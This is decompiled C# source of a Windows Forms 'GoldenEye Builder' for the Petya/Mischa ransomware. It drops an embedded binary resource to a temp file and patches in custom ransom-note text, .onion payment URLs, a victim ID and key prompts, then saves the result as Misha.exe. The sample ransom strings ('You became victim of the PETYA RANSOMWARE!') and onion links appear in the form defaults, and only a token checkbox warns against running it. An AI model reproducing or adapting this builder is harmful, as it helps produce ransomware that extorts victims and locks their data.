

using Petya_and_GoldenEye_BUILDER.Properties;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace Petya_and_GoldenEye_BUILDER
{
  public class Form1 : Form
  {
    private IContainer components = (IContainer) null;
    private string mihabin;
    private string m_origname;
    private string m_origmain;
    private string m_origcode;
    private string m_origif;
    private string m_origkey;
    private string m_onion1;
    private string m_onion2;
    private string m_id;
    private Label label1;
    private GroupBox groupBox1;
    private Label label12;
    private Label label11;
    private Label label10;
    private Label label9;
    private Label label8;
    private TextBox textBox9;
    private TextBox textBox8;
    private TextBox textBox7;
    private TextBox textBox6;
    private TextBox textBox5;
    private Button button1;
    private GroupBox groupBox4;
    private Label label7;
    private Label label5;
    private Label label4;
    private Label label3;
    private Label label2;
    private GroupBox groupBox2;
    private GroupBox groupBox3;
    private GroupBox groupBox5;
    private CheckBox checkBox1;
    private Label label14;
    private Label label15;
    private Label label6;
    private Label label13;
    private TextBox textBox2;
    private TextBox textBox1;
    private Label label16;
    private Label label17;
    private TextBox textBox3;
    private Label label18;

    public Form1()
    {
      this.InitializeComponent();
    }

    private void exitToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.RemoveFiles();
    }

    public void ReplaceMethod()
    {
      if (this.textBox5.Text.Length < this.m_origname.Length)
      {
        string text = this.textBox5.Text;
        for (int index = 0; index < this.m_origname.Length - this.textBox5.Text.Length; ++index)
          text += " ";
        this.textBox5.Text = text;
      }
      if (this.textBox7.Text.Length < this.m_origcode.Length)
      {
        string text = this.textBox7.Text;
        for (int index = 0; index < this.m_origcode.Length - this.textBox7.Text.Length; ++index)
          text += " ";
        this.textBox7.Text = text;
      }
      if (this.textBox8.Text.Length < this.m_origif.Length)
      {
        string text = this.textBox8.Text;
        for (int index = 0; index < this.m_origif.Length - this.textBox8.Text.Length; ++index)
          text += " ";
        this.textBox8.Text = text;
      }
      if (this.textBox9.Text.Length < this.m_origkey.Length)
      {
        string text = this.textBox9.Text;
        for (int index = 0; index < this.m_origkey.Length - this.textBox9.Text.Length; ++index)
          text += " ";
        this.textBox9.Text = text;
      }
      if (this.textBox1.Text.Length < this.m_onion1.Length)
      {
        string text = this.textBox1.Text;
        for (int index = 0; index < this.m_onion1.Length - this.textBox1.Text.Length; ++index)
          text += " ";
        this.textBox1.Text = text;
      }
      if (this.textBox2.Text.Length < this.m_onion2.Length)
      {
        string text = this.textBox2.Text;
        for (int index = 0; index < this.m_onion2.Length - this.textBox2.Text.Length; ++index)
          text += " ";
        this.textBox2.Text = text;
      }
      if (this.textBox3.Text.Length < this.m_id.Length)
      {
        string text = this.textBox3.Text;
        for (int index = 0; index < this.m_id.Length - this.textBox3.Text.Length; ++index)
          text += " ";
        this.textBox3.Text = text;
      }
      if (this.textBox6.Text.Length != 499)
      {
        string text = this.textBox6.Text;
        for (int index = 0; index < 499 - this.textBox6.Text.Length; ++index)
          text += " ";
        this.textBox6.Text = text;
      }
      if (this.textBox6.Text.Split(new string[1]
      {
        Environment.NewLine
      }, StringSplitOptions.None).Length < 10)
      {
        string text = this.textBox6.Text;
        int num = 0;
        while (true)
        {
          if (num < 10 - this.textBox6.Text.Split(new string[1]
          {
            Environment.NewLine
          }, StringSplitOptions.None).Length)
          {
            text += Environment.NewLine;
            ++num;
          }
          else
            break;
        }
        this.textBox6.Text = text;
      }
      this.ReplaceTextInFile(this.mihabin, this.m_origname, this.textBox5.Text);
      this.ReplaceTextInFile(this.mihabin, this.m_origmain, this.textBox6.Text);
      this.ReplaceTextInFile(this.mihabin, this.m_origcode, this.textBox7.Text);
      this.ReplaceTextInFile(this.mihabin, this.m_origif, this.textBox8.Text);
      this.ReplaceTextInFile(this.mihabin, this.m_origkey, this.textBox9.Text);
      this.ReplaceTextInFile(this.mihabin, this.m_onion1, this.textBox1.Text);
      this.ReplaceTextInFile(this.mihabin, this.m_onion2, this.textBox2.Text);
      this.ReplaceTextInFile(this.mihabin, this.m_id, this.textBox3.Text);
      this.textBox1.Text = this.m_onion1;
      this.textBox2.Text = this.m_onion2;
      this.textBox3.Text = this.m_id;
      this.textBox5.Text = this.m_origname;
      this.textBox6.Text = this.m_origmain;
      this.textBox7.Text = this.m_origcode;
      this.textBox8.Text = this.m_origif;
      this.textBox9.Text = this.m_origkey;
    }

    private void button1_Click(object sender, EventArgs e)
    {
      if (this.checkBox1.Checked)
      {
        if (File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe"))
          File.Delete(Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe");
        this.InstallFiles();
        this.ReplaceMethod();
        File.Move(this.mihabin, Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe");
        this.RemoveFiles();
        int num = (int) MessageBox.Show("Done, path: " + Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe", "Successful.", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
      else
      {
        int num1 = (int) MessageBox.Show("Please accept terms of service", "Aborted!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private void ReplaceTextInFile(string fileName, string oldText, string newText)
    {
      byte[] searchBuffer = File.ReadAllBytes(fileName);
      byte[] bytes1 = Encoding.UTF8.GetBytes(oldText);
      byte[] bytes2 = Encoding.UTF8.GetBytes(newText);
      int num = this.IndexOfBytes(searchBuffer, bytes1);
      if (num < 0)
        return;
      byte[] bytes3 = new byte[searchBuffer.Length + bytes2.Length - bytes1.Length];
      Buffer.BlockCopy((Array) searchBuffer, 0, (Array) bytes3, 0, num);
      Buffer.BlockCopy((Array) bytes2, 0, (Array) bytes3, num, bytes2.Length);
      Buffer.BlockCopy((Array) searchBuffer, num + bytes1.Length, (Array) bytes3, num + bytes2.Length, searchBuffer.Length - num - bytes1.Length);
      File.WriteAllBytes(fileName, bytes3);
    }

    private int IndexOfBytes(byte[] searchBuffer, byte[] bytesToFind)
    {
      for (int index1 = 0; index1 < searchBuffer.Length - bytesToFind.Length; ++index1)
      {
        bool flag = true;
        for (int index2 = 0; index2 < bytesToFind.Length; ++index2)
        {
          if ((int) searchBuffer[index1 + index2] != (int) bytesToFind[index2])
          {
            flag = false;
            break;
          }
        }
        if (flag)
          return index1;
      }
      return -1;
    }

    public void InstallFiles()
    {
      File.WriteAllBytes(Path.GetTempPath() + "\\m.bin", Resources.miha);
    }

    public void GetFilePaths()
    {
      this.mihabin = Path.GetTempPath() + "\\m.bin";
    }

    public void LoadOrig()
    {
      this.m_origname = this.textBox5.Text;
      this.m_origmain = this.textBox6.Text;
      this.m_origcode = this.textBox7.Text;
      this.m_origif = this.textBox8.Text;
      this.m_origkey = this.textBox9.Text;
      this.m_onion1 = this.textBox1.Text;
      this.m_onion2 = this.textBox2.Text;
      this.m_id = this.textBox3.Text;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.LoadOrig();
      this.InstallFiles();
      this.GetFilePaths();
    }

    public void RemoveFiles()
    {
      File.Delete(Path.GetTempPath() + "\\g.bin");
    }

    private void button3_Click(object sender, EventArgs e)
    {
      this.textBox5.Text = "";
    }

    private void textBox5_TextChanged(object sender, EventArgs e)
    {
      this.label2.Text = this.textBox5.Text.Length.ToString() + " of";
      if (this.textBox5.Text.Length <= 42)
        return;
      this.textBox5.Text = this.textBox5.Text.Remove(this.textBox5.Text.Length - 1);
    }

    private void textBox6_TextChanged(object sender, EventArgs e)
    {
      this.label3.Text = this.textBox6.Text.Length.ToString() + " of";
      if (this.textBox6.Text.Length <= 499)
        return;
      this.textBox6.Text = this.textBox6.Text.Remove(this.textBox6.Text.Length - 1);
    }

    private void textBox7_TextChanged(object sender, EventArgs e)
    {
      this.label4.Text = this.textBox7.Text.Length.ToString() + " of";
      if (this.textBox7.Text.Length <= 46)
        return;
      this.textBox7.Text = this.textBox7.Text.Remove(this.textBox7.Text.Length - 1);
    }

    private void textBox8_TextChanged(object sender, EventArgs e)
    {
      Label label5 = this.label5;
      TextBox textBox8 = this.textBox8;
      label5.Text = textBox8.Text.Length.ToString() + " of";
      if (textBox8.Text.Length <= 57)
        return;
      textBox8.Text = textBox8.Text.Remove(textBox8.Text.Length - 1);
    }

    private void textBox9_TextChanged(object sender, EventArgs e)
    {
      Label label7 = this.label7;
      TextBox textBox9 = this.textBox9;
      label7.Text = textBox9.Text.Length.ToString() + " of";
      if (textBox9.Text.Length <= 32)
        return;
      textBox9.Text = textBox9.Text.Remove(textBox9.Text.Length - 1);
    }

    private void textBox1_TextChanged(object sender, EventArgs e)
    {
      Label label14 = this.label14;
      TextBox textBox1 = this.textBox1;
      label14.Text = textBox1.Text.Length.ToString() + " of";
      if (textBox1.Text.Length <= 36)
        return;
      textBox1.Text = textBox1.Text.Remove(textBox1.Text.Length - 1);
    }

    private void textBox2_TextChanged(object sender, EventArgs e)
    {
      Label label6 = this.label6;
      TextBox textBox2 = this.textBox2;
      label6.Text = textBox2.Text.Length.ToString() + " of";
      if (textBox2.Text.Length <= 38)
        return;
      textBox2.Text = textBox2.Text.Remove(textBox2.Text.Length - 1);
    }

    private void textBox3_TextChanged(object sender, EventArgs e)
    {
      Label label16 = this.label16;
      TextBox textBox3 = this.textBox3;
      label16.Text = textBox3.Text.Length.ToString() + " of";
      if (textBox3.Text.Length <= 96)
        return;
      textBox3.Text = textBox3.Text.Remove(textBox3.Text.Length - 1);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.label1 = new Label();
      this.groupBox1 = new GroupBox();
      this.label18 = new Label();
      this.label16 = new Label();
      this.label17 = new Label();
      this.textBox3 = new TextBox();
      this.label14 = new Label();
      this.label15 = new Label();
      this.label6 = new Label();
      this.label13 = new Label();
      this.textBox2 = new TextBox();
      this.textBox1 = new TextBox();
      this.label7 = new Label();
      this.label5 = new Label();
      this.label4 = new Label();
      this.label3 = new Label();
      this.label2 = new Label();
      this.label12 = new Label();
      this.label11 = new Label();
      this.label10 = new Label();
      this.label9 = new Label();
      this.label8 = new Label();
      this.textBox9 = new TextBox();
      this.textBox8 = new TextBox();
      this.textBox7 = new TextBox();
      this.textBox6 = new TextBox();
      this.textBox5 = new TextBox();
      this.button1 = new Button();
      this.groupBox4 = new GroupBox();
      this.groupBox2 = new GroupBox();
      this.groupBox3 = new GroupBox();
      this.groupBox5 = new GroupBox();
      this.checkBox1 = new CheckBox();
      this.groupBox1.SuspendLayout();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 204);
      this.label1.ForeColor = Color.Lime;
      this.label1.Location = new Point(20, 21);
      this.label1.Name = "label1";
      this.label1.Size = new Size(408, 18);
      this.label1.TabIndex = 0;
      this.label1.Text = "you became a victim of the MISCHA RANSOMWARE!";
      this.groupBox1.BackColor = Color.Black;
      this.groupBox1.Controls.Add((Control) this.label18);
      this.groupBox1.Controls.Add((Control) this.label16);
      this.groupBox1.Controls.Add((Control) this.label17);
      this.groupBox1.Controls.Add((Control) this.textBox3);
      this.groupBox1.Controls.Add((Control) this.label14);
      this.groupBox1.Controls.Add((Control) this.label15);
      this.groupBox1.Controls.Add((Control) this.label6);
      this.groupBox1.Controls.Add((Control) this.label13);
      this.groupBox1.Controls.Add((Control) this.textBox2);
      this.groupBox1.Controls.Add((Control) this.textBox1);
      this.groupBox1.Controls.Add((Control) this.label7);
      this.groupBox1.Controls.Add((Control) this.label5);
      this.groupBox1.Controls.Add((Control) this.label4);
      this.groupBox1.Controls.Add((Control) this.label3);
      this.groupBox1.Controls.Add((Control) this.label2);
      this.groupBox1.Controls.Add((Control) this.label12);
      this.groupBox1.Controls.Add((Control) this.label11);
      this.groupBox1.Controls.Add((Control) this.label10);
      this.groupBox1.Controls.Add((Control) this.label9);
      this.groupBox1.Controls.Add((Control) this.label8);
      this.groupBox1.Controls.Add((Control) this.textBox9);
      this.groupBox1.Controls.Add((Control) this.textBox8);
      this.groupBox1.Controls.Add((Control) this.textBox7);
      this.groupBox1.Controls.Add((Control) this.textBox6);
      this.groupBox1.Controls.Add((Control) this.textBox5);
      this.groupBox1.ForeColor = Color.Lime;
      this.groupBox1.Location = new Point(23, 42);
      this.groupBox1.Name = "groupBox1";
      this.groupBox1.Size = new Size(444, 370);
      this.groupBox1.TabIndex = 7;
      this.groupBox1.TabStop = false;
      this.groupBox1.Text = "Expert editor MISCHA";
      this.label18.AutoSize = true;
      this.label18.ForeColor = Color.Silver;
      this.label18.Location = new Point(286, 334);
      this.label18.Name = "label18";
      this.label18.Size = new Size(65, 13);
      this.label18.TabIndex = 24;
      this.label18.Text = "(this is an id)";
      this.label16.AutoSize = true;
      this.label16.ForeColor = Color.Silver;
      this.label16.Location = new Point(348, 336);
      this.label16.Name = "label16";
      this.label16.Size = new Size(40, 13);
      this.label16.TabIndex = 23;
      this.label16.Text = "XXX of";
      this.label17.AutoSize = true;
      this.label17.ForeColor = Color.Silver;
      this.label17.Location = new Point(385, 336);
      this.label17.Name = "label17";
      this.label17.Size = new Size(48, 13);
      this.label17.TabIndex = 22;
      this.label17.Text = "96 chars";
      this.textBox3.BackColor = Color.Black;
      this.textBox3.ForeColor = Color.FromArgb(0, 192, 0);
      this.textBox3.Location = new Point(6, 318);
      this.textBox3.Multiline = true;
      this.textBox3.Name = "textBox3";
      this.textBox3.Size = new Size(432, 35);
      this.textBox3.TabIndex = 21;
      this.textBox3.Text = "fdREF2yU2H89wqVVtUtj6oVYjezDpdjfKKexPWmMKGP8ewwTUWAuPRJ1bsyK2YNyPEUHUWAmyvjo9ayVFjq55JLtuD908fA1";
      this.textBox3.TextChanged += new EventHandler(this.textBox3_TextChanged);
      this.label14.AutoSize = true;
      this.label14.ForeColor = Color.Silver;
      this.label14.Location = new Point(348, 220);
      this.label14.Name = "label14";
      this.label14.Size = new Size(40, 13);
      this.label14.TabIndex = 20;
      this.label14.Text = "XXX of";
      this.label15.AutoSize = true;
      this.label15.ForeColor = Color.Silver;
      this.label15.Location = new Point(385, 220);
      this.label15.Name = "label15";
      this.label15.Size = new Size(48, 13);
      this.label15.TabIndex = 19;
      this.label15.Text = "36 chars";
      this.label6.AutoSize = true;
      this.label6.ForeColor = Color.Silver;
      this.label6.Location = new Point(348, 245);
      this.label6.Name = "label6";
      this.label6.Size = new Size(40, 13);
      this.label6.TabIndex = 18;
      this.label6.Text = "XXX of";
      this.label13.AutoSize = true;
      this.label13.ForeColor = Color.Silver;
      this.label13.Location = new Point(385, 245);
      this.label13.Name = "label13";
      this.label13.Size = new Size(48, 13);
      this.label13.TabIndex = 17;
      this.label13.Text = "38 chars";
      this.textBox2.BackColor = Color.Black;
      this.textBox2.ForeColor = Color.FromArgb(0, 192, 0);
      this.textBox2.Location = new Point(6, 242);
      this.textBox2.Name = "textBox2";
      this.textBox2.Size = new Size(432, 20);
      this.textBox2.TabIndex = 16;
      this.textBox2.Text = "http://petya3sen7dyko2n.onion/dREF2y";
      this.textBox2.TextChanged += new EventHandler(this.textBox2_TextChanged);
      this.textBox1.BackColor = Color.Black;
      this.textBox1.ForeColor = Color.FromArgb(0, 192, 0);
      this.textBox1.Location = new Point(6, 217);
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(432, 20);
      this.textBox1.TabIndex = 15;
      this.textBox1.Text = "http://petya3jxfp2f7g3i.onion/dREF2y";
      this.textBox1.TextChanged += new EventHandler(this.textBox1_TextChanged);
      this.label7.AutoSize = true;
      this.label7.ForeColor = Color.Silver;
      this.label7.Location = new Point(348, 295);
      this.label7.Name = "label7";
      this.label7.Size = new Size(40, 13);
      this.label7.TabIndex = 14;
      this.label7.Text = "XXX of";
      this.label5.AutoSize = true;
      this.label5.ForeColor = Color.Silver;
      this.label5.Location = new Point(348, 270);
      this.label5.Name = "label5";
      this.label5.Size = new Size(40, 13);
      this.label5.TabIndex = 13;
      this.label5.Text = "XXX of";
      this.label4.AutoSize = true;
      this.label4.ForeColor = Color.Silver;
      this.label4.Location = new Point(348, 196);
      this.label4.Name = "label4";
      this.label4.Size = new Size(40, 13);
      this.label4.TabIndex = 12;
      this.label4.Text = "XXX of";
      this.label3.AutoSize = true;
      this.label3.ForeColor = Color.Silver;
      this.label3.Location = new Point(342, 170);
      this.label3.Name = "label3";
      this.label3.Size = new Size(40, 13);
      this.label3.TabIndex = 11;
      this.label3.Text = "XXX of";
      this.label2.AutoSize = true;
      this.label2.ForeColor = Color.Silver;
      this.label2.Location = new Point(346, 23);
      this.label2.Name = "label2";
      this.label2.Size = new Size(40, 13);
      this.label2.TabIndex = 10;
      this.label2.Text = "XXX of";
      this.label12.AutoSize = true;
      this.label12.ForeColor = Color.Silver;
      this.label12.Location = new Point(385, 295);
      this.label12.Name = "label12";
      this.label12.Size = new Size(48, 13);
      this.label12.TabIndex = 9;
      this.label12.Text = "32 chars";
      this.label11.AutoSize = true;
      this.label11.ForeColor = Color.Silver;
      this.label11.Location = new Point(385, 270);
      this.label11.Name = "label11";
      this.label11.Size = new Size(48, 13);
      this.label11.TabIndex = 8;
      this.label11.Text = "57 chars";
      this.label10.AutoSize = true;
      this.label10.ForeColor = Color.Silver;
      this.label10.Location = new Point(385, 196);
      this.label10.Name = "label10";
      this.label10.Size = new Size(48, 13);
      this.label10.TabIndex = 7;
      this.label10.Text = "46 chars";
      this.label9.AutoSize = true;
      this.label9.ForeColor = Color.Silver;
      this.label9.Location = new Point(379, 170);
      this.label9.Name = "label9";
      this.label9.Size = new Size(54, 13);
      this.label9.TabIndex = 6;
      this.label9.Text = "499 chars";
      this.label8.AutoSize = true;
      this.label8.ForeColor = Color.Silver;
      this.label8.Location = new Point(385, 23);
      this.label8.Name = "label8";
      this.label8.Size = new Size(48, 13);
      this.label8.TabIndex = 5;
      this.label8.Text = "42 chars";
      this.textBox9.BackColor = Color.Black;
      this.textBox9.ForeColor = Color.FromArgb(0, 192, 0);
      this.textBox9.Location = new Point(6, 292);
      this.textBox9.Name = "textBox9";
      this.textBox9.Size = new Size(432, 20);
      this.textBox9.TabIndex = 4;
      this.textBox9.Text = "Incorrect key! Please try again.";
      this.textBox9.TextChanged += new EventHandler(this.textBox9_TextChanged);
      this.textBox8.BackColor = Color.Black;
      this.textBox8.ForeColor = Color.FromArgb(0, 192, 0);
      this.textBox8.Location = new Point(6, 267);
      this.textBox8.Name = "textBox8";
      this.textBox8.Size = new Size(432, 20);
      this.textBox8.TabIndex = 3;
      this.textBox8.Text = "If you already purchased your key, please enter it below.";
      this.textBox8.TextChanged += new EventHandler(this.textBox8_TextChanged);
      this.textBox7.BackColor = Color.Black;
      this.textBox7.ForeColor = Color.FromArgb(0, 192, 0);
      this.textBox7.Location = new Point(6, 192);
      this.textBox7.Name = "textBox7";
      this.textBox7.Size = new Size(432, 20);
      this.textBox7.TabIndex = 2;
      this.textBox7.Text = " 3. Enter your personal decryption code there:";
      this.textBox7.TextChanged += new EventHandler(this.textBox7_TextChanged);
      this.textBox6.BackColor = Color.Black;
      this.textBox6.ForeColor = Color.FromArgb(0, 192, 0);
      this.textBox6.Location = new Point(6, 44);
      this.textBox6.Multiline = true;
      this.textBox6.Name = "textBox6";
      this.textBox6.Size = new Size(432, 143);
      this.textBox6.TabIndex = 1;
      this.textBox6.Text = componentResourceManager.GetString("textBox6.Text");
      this.textBox6.TextChanged += new EventHandler(this.textBox6_TextChanged);
      this.textBox5.BackColor = Color.Black;
      this.textBox5.ForeColor = Color.FromArgb(0, 192, 0);
      this.textBox5.Location = new Point(6, 20);
      this.textBox5.Name = "textBox5";
      this.textBox5.Size = new Size(432, 20);
      this.textBox5.TabIndex = 0;
      this.textBox5.Text = "You became victim of the PETYA RANSOMWARE!";
      this.textBox5.TextChanged += new EventHandler(this.textBox5_TextChanged);
      this.button1.FlatStyle = FlatStyle.Flat;
      this.button1.ForeColor = Color.Lime;
      this.button1.Location = new Point(23, 441);
      this.button1.Name = "button1";
      this.button1.Size = new Size(444, 33);
      this.button1.TabIndex = 14;
      this.button1.Text = "BUILD GOLDENEYE";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.groupBox4.Location = new Point(5, 474);
      this.groupBox4.Name = "groupBox4";
      this.groupBox4.Size = new Size(478, 22);
      this.groupBox4.TabIndex = 17;
      this.groupBox4.TabStop = false;
      this.groupBox2.Location = new Point(5, 16);
      this.groupBox2.Name = "groupBox2";
      this.groupBox2.Size = new Size(11, 461);
      this.groupBox2.TabIndex = 17;
      this.groupBox2.TabStop = false;
      this.groupBox3.Location = new Point(472, 18);
      this.groupBox3.Name = "groupBox3";
      this.groupBox3.Size = new Size(11, 459);
      this.groupBox3.TabIndex = 18;
      this.groupBox3.TabStop = false;
      this.groupBox5.Location = new Point(5, 0);
      this.groupBox5.Name = "groupBox5";
      this.groupBox5.Size = new Size(478, 18);
      this.groupBox5.TabIndex = 18;
      this.groupBox5.TabStop = false;
      this.checkBox1.AutoSize = true;
      this.checkBox1.Location = new Point(23, 418);
      this.checkBox1.Name = "checkBox1";
      this.checkBox1.Size = new Size(300, 17);
      this.checkBox1.TabIndex = 19;
      this.checkBox1.Text = "You will not run this program on your or someone else's PC";
      this.checkBox1.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.Black;
      this.ClientSize = new Size(489, 503);
      this.Controls.Add((Control) this.checkBox1);
      this.Controls.Add((Control) this.groupBox5);
      this.Controls.Add((Control) this.groupBox3);
      this.Controls.Add((Control) this.groupBox2);
      this.Controls.Add((Control) this.groupBox4);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.groupBox1);
      this.Controls.Add((Control) this.label1);
      this.ForeColor = Color.Lime;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Form1);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "GoldenEye Builder V1.O";
      this.Load += new EventHandler(this.Form1_Load);
      this.groupBox1.ResumeLayout(false);
      this.groupBox1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
